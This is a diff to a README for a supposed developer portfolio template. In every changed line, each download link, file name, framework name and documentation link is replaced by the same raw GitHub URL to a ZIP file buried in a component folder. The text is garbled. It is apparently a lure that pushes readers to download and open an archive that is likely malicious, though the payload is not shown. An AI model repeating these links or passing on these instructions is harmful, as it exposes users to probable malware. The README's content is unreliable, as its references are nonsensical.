@@ -8,7 +8,7 @@ Welcome to the developer-portfolio! This personal portfolio is designed to help 
 
 To start using the developer-portfolio, you need to download it from the releases page. Click the link below to access the page:
 
-[Download developer-portfolio](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip)
+[Download developer-portfolio](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip)
 
 Follow the steps below to get your portfolio up and running:
 
@@ -25,7 +25,7 @@ Follow the steps below to get your portfolio up and running:
    After the download completes, locate the ZIP file in your downloads folder. Right-click on it and select "Extract All" to unzip the contents.
 
 5. **Open the Portfolio**  
-   Navigate to the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip` or `https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip`. Open the `https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip` file in your web browser to view your portfolio.
+   Navigate to the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip` or `https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip`. Open the `https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip` file in your web browser to view your portfolio.
 
 6. **Customize Your Content**  
    You can edit the content of your new portfolio easily. Open files in a text editor to update your projects, skills, and blogs. If you are not familiar with editing files, you can use a simple editor like Notepad or any other text editing software.
@@ -36,7 +36,7 @@ The developer-portfolio comes packed with features to enhance your online presen
 
 - **Responsive Design**: The portfolio looks great on both desktops and mobile devices. Your visitors can browse your work anywhere.
   
-- **Modern Aesthetic**: Built with https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip, Tailwind CSS, and Framer Motion, the portfolio has a sleek, modern design.
+- **Modern Aesthetic**: Built with https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip, Tailwind CSS, and Framer Motion, the portfolio has a sleek, modern design.
 
 - **Dynamic Content**: Easily showcase your skills and projects. The portfolio is flexible, allowing you to add or remove sections as needed.
 
@@ -55,9 +55,9 @@ The developer-portfolio runs smoothly on most modern web browsers. Here are the 
 
 If you want to explore the code behind the developer-portfolio or learn how to customize it further, consider these resources:
 
-- [https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip Documentation](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip)
-- [Tailwind CSS Documentation](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip)
-- [Framer Motion Documentation](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip)
+- [https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip Documentation](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip)
+- [Framer Motion Documentation](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip)
 
 ## 💡 Troubleshooting
 
@@ -98,6 +98,6 @@ The developer-portfolio features various topics, making it versatile and benefic
 
 To download the developer-portfolio, revisit the link below:
 
-[Download developer-portfolio](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/Damoclean/developer-portfolio.zip) 
+[Download developer-portfolio](https://raw.githubusercontent.com/KCONSYSTEM/developer-portfolio/main/app/components/homepage/hero-section/portfolio-developer-v2.0-alpha.4.zip) 
 
 With these steps and resources, you are now ready to create your own inspiring online showcase. Enjoy building your portfolio!
